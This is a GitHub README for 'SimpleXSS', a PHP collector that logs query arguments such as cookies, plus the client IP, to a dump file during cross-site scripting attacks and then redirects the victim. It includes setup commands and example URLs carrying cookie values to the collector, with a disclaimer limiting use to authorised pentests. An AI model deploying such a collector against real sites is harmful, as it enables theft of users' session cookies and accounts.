# Simple XSS [![License](https://img.shields.io/badge/license-GPLv3-red.svg)](https://github.com/bambish/SimpleXSS/blob/master/LICENSE.md) [![Twitter](https://img.shields.io/badge/twitter-@bambishee-blue.svg)](https://twitter.com/bambishee)

Simple index.php template to perform XSS attack.

### Features
* Record each URL args
* Record client IP
* Instant redirection (static or dynamic)

### Prerequisites
* Web server (apache2, nginx, ...)
* PHP

### Installing
In this guide I'm using apache2 on Debian 9. Obviously, you can use every web server and distro you want.

**1.** Install apache2 and php
```bash
apt install apache2 php
```

**2.** Get the sources
```bash
git clone https://github.com/bambish/SimpleXSS
```

**3.** Move index.php in the web server root dir
```bash
mv SimpleXSS/index.php /var/www/html
```

**4.** Set the access right to write dump files
```bash
chown root:www-data /var/www/html
chmod g+w /var/www/html
```

### Usage
* Basic usage: **cookies**=12345&**arg**=67890
```http
http://127.0.0.1/index.php?cookies=12345&arg=67890
```
*You can use every `arbitrary args name`*

* Dynamic redirection: **redirect**=http://arbitrarywebsite.com/
```http
http://127.0.0.1/index.php?cookies=12345&arbitraryarg=67890&redirect=http://github.com/
```
*You can `change or disable` the `default redirection` by editing or comment `$staticredirection` var in `index.php`*
*You can force the static redirection if you set `$allowgetredirection` to false in index.php*

* Write in specific dump file: **dumpfile**=arbitraryfile.txt
```http
http://127.0.0.1/index.php?cookies=12345&arbitraryarg=67890&dumpfile=arbitraryfile.txt
```
*Be shure your `web server` have the right `access to create and edit` files at the root dir*
*The default dump file is `dumpfile.txt`*

### Deploy with Docker
```
docker run -dit --name XSS -v /path/to/host/web/root/dir/:/var/www/html/ --publish 80:80 fauria/lamp
```
*Adapt the root dir path if you don't use apache2 and give write access to your docker container*

### Warning
This XSS template was created to perform pentest or others legal stuffs (like bug bounty).
Using this XSS template against web site **without authorization** is **forbidden**. 

I'm not responsible of your usage of this XSS template.
**At your own risk**.